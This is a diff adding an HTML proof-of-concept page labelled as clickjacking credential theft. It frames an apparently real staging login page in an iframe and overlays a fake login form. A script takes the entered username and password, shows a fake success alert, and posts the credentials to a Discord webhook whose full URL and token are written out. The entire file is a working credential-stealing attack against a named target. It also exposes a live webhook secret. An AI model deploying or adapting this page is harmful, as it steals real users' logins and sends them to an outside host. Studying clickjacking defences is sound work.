@@ -1,0 +1,77 @@
+<html>
+<head>
+    <title>Clickjacking PoC - Credential Theft</title>
+    <style>
+        iframe { 
+            width: 800px; 
+            height: 500px; 
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            filter: alpha(opacity=50); 
+            opacity: 0.9; 
+            z-index: 1;
+        }
+        .overlay-form {
+            position: absolute;
+            top: 150px;
+            left: 100px;
+            z-index: 2;
+            background: rgba(255,255,255,0.8);
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+        }
+        .overlay-form input {
+            display: block;
+            margin: 10px 0;
+            padding: 8px;
+            width: 90%;
+        }
+        .overlay-form button {
+            padding: 8px 15px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <iframe src="https://formio.kube01.stage.brandmuscle.net/#/auth/login"></iframe>
+    
+    <div class="overlay-form">
+        <h3>Please login to continue</h3>
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="stealCredentials()">Login</button>
+    </div>
+
+    <script>
+        function stealCredentials() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Display fake success message
+            alert('Login successful! Redirecting...');
+            
+            // Send stolen credentials to Discord webhook
+            const webhookUrl = 'https://discord.com/api/webhooks/1376780669153181798/5PptIvEGUSZuPSSsLsAch43kP3m9sqVUm8aLka2AHXiuvLsmPmPYlr1BQs7uStdvGLaq';
+            const message = {
+                content: `⚠️ Clickjacking PoC - Stolen Credentials\nUsername: ${username}\nPassword: ${password}\nFrom: ${window.location.href}`
+            };
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => console.log('Credentials sent to webhook'))
+            .catch(error => console.error('Error sending to webhook:', error));
+        }
+    </script>
+</body>
+</html>
